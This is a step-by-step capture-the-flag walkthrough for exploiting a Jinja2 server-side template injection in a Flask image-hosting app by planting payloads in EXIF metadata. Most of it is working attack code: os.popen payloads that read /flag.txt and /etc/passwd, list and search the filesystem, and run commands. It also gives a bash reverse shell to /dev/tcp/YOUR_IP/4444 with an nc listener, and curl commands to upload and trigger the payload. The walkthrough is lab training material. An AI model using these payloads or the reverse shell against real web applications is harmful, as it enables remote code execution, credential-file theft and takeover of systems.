# Manual Exploitation Guide - Step by Step

This guide provides detailed manual steps to exploit the SSTI vulnerability without using the automated script.

## Prerequisites

Install required tools:

```bash
sudo apt-get update
sudo apt-get install imagemagick libimage-exiftool-perl curl
```

## Step-by-Step Exploitation

### Step 1: Understand the Target

The application is a Flask-based image CDN that:

- Allows user registration and login
- Accepts image uploads (png, jpg, jpeg, bmp)
- Extracts EXIF metadata using exiftool
- Displays posts with metadata

**Target URL:** `http://localhost:4500` (or your challenge server)

### Step 2: Create a Malicious Image

First, create a simple test image:

```bash
# Create a 100x100 white PNG image
convert -size 100x100 xc:white test.png
```

Verify the image was created:

```bash
ls -lh test.png
file test.png
```

### Step 3: Inject SSTI Payload into EXIF Metadata

Choose one of the following payloads:

#### Payload A: Simple Test (Verify SSTI)

```bash
exiftool -FileName='{{ 7*7 }}' test.png
```

**Expected result:** Should display "49" in the metadata

#### Payload B: Read Flag (Primary Exploit)

```bash
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' test.png
```

#### Payload C: Alternative Flag Reading (Using lipsum)

```bash
exiftool -FileName='{{ lipsum.__globals__.os.popen("cat /flag.txt").read() }}' test.png
```

#### Payload D: RCE Test (Run 'id' command)

```bash
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("id").read() }}' test.png
```

Verify the EXIF data was injected:

```bash
exiftool test.png | grep "File Name"
```

### Step 4: Register a User Account

```bash
curl -i -X POST http://localhost:4500/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=SecurePass123" \
  -c cookies.txt \
  -L
```

**What to look for:**

- HTTP 302 redirect to login page
- Flash message: "Registered. Please login."

### Step 5: Login to the Application

```bash
curl -i -X POST http://localhost:4500/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=SecurePass123" \
  -c cookies.txt \
  -b cookies.txt \
  -L
```

**What to look for:**

- HTTP 302 redirect to gallery
- Flash message: "Welcome, attacker!"
- Session cookie in cookies.txt

Verify you're logged in:

```bash
curl -s http://localhost:4500/gallery \
  -b cookies.txt | grep "attacker"
```

### Step 6: Upload the Malicious Image

```bash
curl -i -X POST http://localhost:4500/upload \
  -b cookies.txt \
  -F "title=My Exploit Image" \
  -F "image=@test.png" \
  -L
```

**What to look for:**

- HTTP 302 redirect to gallery
- Flash message: "Upload complete."

### Step 7: Get the Post ID

List your posts in the gallery:

```bash
curl -s http://localhost:4500/gallery \
  -b cookies.txt | grep -oP '/post/\d+' | head -1
```

This should output something like `/post/1`. Note the post ID (e.g., `1`).

Or manually inspect the gallery HTML:

```bash
curl -s http://localhost:4500/gallery -b cookies.txt > gallery.html
cat gallery.html | grep "href=\"/post/"
```

### Step 8: Trigger the SSTI Vulnerability

View the post to trigger the vulnerability:

```bash
curl -s http://localhost:4500/post/1 -b cookies.txt > response.html
```

### Step 9: Extract the Flag

Search for the flag in the response:

```bash
cat response.html | grep -oP 'GEMASTIK\{[^}]+\}'
```

Or view the metadata section:

```bash
cat response.html | grep -A5 "File Name:"
```

Or view the full response:

```bash
cat response.html | less
```

The flag should appear where the "File Name" metadata is displayed.

## Alternative: Using Browser

If you prefer using a browser:

1. **Open the application:**

   - Navigate to `http://localhost:4500`

2. **Register an account:**

   - Click "Register"
   - Enter username and password
   - Click "Register"

3. **Login:**

   - Enter your credentials
   - Click "Login"

4. **Upload malicious image:**

   - Click "Upload"
   - Choose your crafted `test.png` file
   - Enter a title
   - Click "Upload"

5. **View the post:**
   - Click on your uploaded image in the gallery
   - View page source (Ctrl+U or Cmd+Option+U)
   - Search for "File Name:" in the source
   - The flag should be visible in the metadata section

## Debugging Tips

### Verify EXIF Payload is Present

After creating the malicious image:

```bash
exiftool test.png | grep "File Name"
```

Should show your payload:

```
File Name                       : {{ 7*7 }}
```

### Check Session Cookie

Verify you have a valid session:

```bash
cat cookies.txt
```

Should contain a line like:

```
localhost	FALSE	/	FALSE	0	session	eyJ...
```

### View Full Metadata

To see all metadata extracted by the application:

```bash
curl -s "http://localhost:4500/post/1?meta=1" -b cookies.txt
```

This shows the raw output from exiftool.

### Test with Simple Payload First

Before trying complex payloads, test with the simple math payload:

```bash
exiftool -FileName='{{ 7*7 }}' test.png
```

If you see "49" in the response, SSTI is confirmed and you can proceed with the flag-reading payload.

### Common Issues

**Issue:** "Unsupported file type"

- **Solution:** Make sure the image has a valid extension (.png, .jpg, .jpeg, .bmp)

**Issue:** "Please log in to continue"

- **Solution:** Your session expired or cookies weren't saved. Login again.

**Issue:** "404 Not Found" when viewing post

- **Solution:** You're trying to access another user's post. Make sure you're viewing your own uploaded post.

**Issue:** Payload not executing

- **Solution:**
  1. Verify the EXIF data was actually written to the image
  2. Try a different payload
  3. Check if the application is filtering certain characters

## Advanced Payloads

### List All Files in Root

```bash
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("ls -la /").read() }}' test.png
```

### Read /etc/passwd

```bash
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /etc/passwd").read() }}' test.png
```

### Find Flag Location

```bash
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("find / -name flag.txt 2>/dev/null").read() }}' test.png
```

### Reverse Shell (Advanced)

```bash
# Set up listener first: nc -lvnp 4444
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"").read() }}' test.png
```

## Using Date Created Field Instead

If the File Name field doesn't work, try the Date Created field:

```bash
exiftool -DateCreated='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' test.png
```

The vulnerability exists in both fields since both are extracted and injected into the template.

## Clean Up

After successful exploitation, you can delete your uploaded images:

```bash
# Login to the container (if you have SSH access)
ssh ctfuser@localhost -p 4522
# Password: root (from docker-compose.yml)

# Check uploads directory
ls -la /app/uploads/

# Clean up test images
rm /app/uploads/*.png
```

## Summary

The complete exploit chain:

1. Create image with ImageMagick
2. Inject Jinja2 SSTI payload into EXIF metadata with exiftool
3. Register and login to the application
4. Upload the malicious image
5. View the post to trigger template rendering
6. Extract the flag from the HTML response

**Key vulnerability:** `render_template_string()` with unescaped user-controlled EXIF data allows Jinja2 template injection and RCE.

